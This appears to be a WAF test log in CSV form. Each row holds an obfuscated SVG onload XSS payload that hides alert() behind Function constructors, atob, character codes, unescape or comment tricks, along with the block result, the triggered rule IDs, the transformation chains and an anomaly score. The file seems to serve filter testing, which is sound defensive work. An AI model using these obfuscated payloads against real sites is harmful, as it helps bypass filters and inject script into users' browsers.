2450,"<svg onload=""new Function('al\145rt\501\51')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,48 || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603566682.760761
2451,"<svg onload=""new Function(['al','er','t(',1,')'].join(''))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760356670.770301
2452,"<svg onload=""new Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603566822.031351
2456,"<svg onload=""new Function(unescape('%61%6c%65%72%74%28%31%29'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,67 || o13,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603567324.267023
2463,"<svg onload=""new(self.Function)('ale'+'rt(9)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,32v216,50t:urlDecode,t:replaceComments,t:compressWhitespace || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603568120.390628
2470,"<svg onload=""top.Function('retu'+'rn ale'+'rt(9)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603569064.300403
2476,"<svg onload=""new(false['__proto__']['__proto__']['constructor']['constructor'])('ale'+'rt(9)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,80v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603569825.272055
2478,"<svg onload=""Function('ale'+'rt(1)')()"">",0,1,block,6,"941100,941120,941160,942100,942100,949110","v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,40 || v216,40t:urlDecodeUni || ",25,177603570161.970752
2491,"<svg onload=""new/**/Function/**/('ale'+'rt(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603571877.132316
2496,"<svg onload=""new Function('ret'+'urn aler'+'t')()(1)""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o25,27v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,60 || o13,13v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603572451.209586
2498,"<svg onload=""new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116))()(1)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603572755.177266
2499,"<svg onload=""new Function(['ret','urn ale','rt'].join(''))()(1)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o53,10v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760357280.904977
2500,"<svg onload=""new/**/ Function('return ale'+'rt')()(1)""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o25,24v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603572929.428507
2501,"<svg onload=""new Function(`return ale`+`rt`)()(1)""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,57 || o13,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603573034.936851
2502,"<svg onload=""new Function('return\x20ale'+'rt')()(1)""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o13,13v217,60 || o13,13v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603573195.214920
2503,"<svg onload=""new Function(atob('cmV0dXJuIGFsZXJ0'))()(1)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o25,31v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603573336.383414
2504,"<svg onload=""new Function('return\u0020\u0061lert')()(1)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603573495.860113
2509,"<svg onload=""new Function('re'+'turn al'+'ert')()(1)""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o25,27v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,60 || o13,13v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603574057.439432
2510,"<svg onload=""new Function(['r','e','t','u','r','n',' ','a','l','e','r','t'].join(''))()(1)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o80,10v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603574170.681812
2511,"<svg onload=""new Function(window[String.fromCharCode(97,116,111,98)]('cmV0dXJuIGFsZXJ0'))()(1)""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o68,26v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o13,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,42v217,102t:urlDecodeUni,t:compressWhitespace || ",30,177603574324.962974
2514,"<svg onload=""new Function('re\u0074urn\u0020al\u0065rt')()(1)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603574784.396988
2515,"<svg onload=""Function(atob('YWxlcnQoMSk='))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603574818.141725
2517,"<svg onload=""(new(Function.bind.apply(Function,[null,atob('YWxlcnQoMSk=')])))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603575083.753545
2519,"<svg onload=""top['Function'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,36v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,60t:urlDecodeUni,t:compressWhitespace || ",25,177603575329.275505
2524,"<svg onload=""Function['prototype']['constructor'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o21,52v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603575947.351668
2525,"<svg onload=""(function(){return this})()['Function'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,63v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603576012.054318
2526,"<svg onload=""globalThis['Function'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o23,36v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603576254.645334
2528,"<svg/onload=""new/**/Function(atob('YWxlcnQoMSk='))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603576430.426442
2531,"<svg onload=""Reflect['construct'](Function,[atob('YWxlcnQoMSk=')])()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o20,48v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603576715.875146
2535,"<svg onload=""new(Function)(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,42v216,60t:urlDecode,t:replaceComments,t:compressWhitespace || v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603577263.623967
2538,"<svg onload=""new/**/(/**/Function/**/)/**/(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o17,45v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603577662.341103
2539,"<svg onload=""window['Function'](atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,44v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,65t:urlDecodeUni,t:compressWhitespace || ",25,177603577782.354636
2543,"<svg onload=""new top.Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760357829.579272
2544,"<svg onload=""new parent.Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603578334.304626
2545,"<svg onload=""new&#9;Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603578486.584578
2546,"<svg onload=""new&#10;Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603578554.243131
2547,"<svg onload=""new&#13;Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760357871.634558
2549,"<svg onload=""Function['constructor'](atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,47v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603578984.677703
2550,"<svg onload=""new(window.Function)(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,49v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579083.177854
2551,"<svg onload=""new Function(atob`cmV0dXJuIGFsZXJ0KDEp`)()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,57 || v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579150.662840
2552,"<svg onload=""new Function(self.atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,64 || v216,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579345.193086
2553,"<svg onload=""new Function(window.atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579416.007020
2554,"<svg onload=""(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579587.967771
2559,"<svg onload=""self['Function'](decodeURI('%61%6C%65%72%74%28%31%29'))()""></svg>",0,1,block,7,"933210,941100,941120,941160,941370,942100,949110","o17,37v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,78t:urlDecodeUni,t:compressWhitespace || v217,78 || ",30,177603580166.417056
2578,"<svg onload=""setTimeout(Function(String.fromCharCode(97,108,101,114,116,40,49,41)),0)"">",0,1,block,5,"934100,941100,941120,941160,949110","o33,19v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603582632.340378
2580,"<svg onload=""setTimeout(Function('al\u0065rt(1)'),0)"">",0,1,block,4,"941100,941120,941160,949110","v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603582875.947724
2585,"<svg onload=""setTimeout(Function(atob('YWxlcnQoMSk=')),0)"">",0,1,block,4,"941100,941120,941160,949110","v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603583595.399634
2589,"<svg onload=""setTimeout(globalThis['Function']('al'+'ert(1)'),0)"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,41v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603584031.790769
2591,"<svg onload=""setTimeout(Function('al\145rt(1)'),0)"">",0,1,block,4,"941100,941120,941160,949110","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603584257.944051
2616,"<svg onload=""Promise.resolve().then(function(){var a=atob('YWxlcnQoMSk=');eval(a)})""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o73,5v217,91 || o74,9v217,91 || o36,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603587519.691153
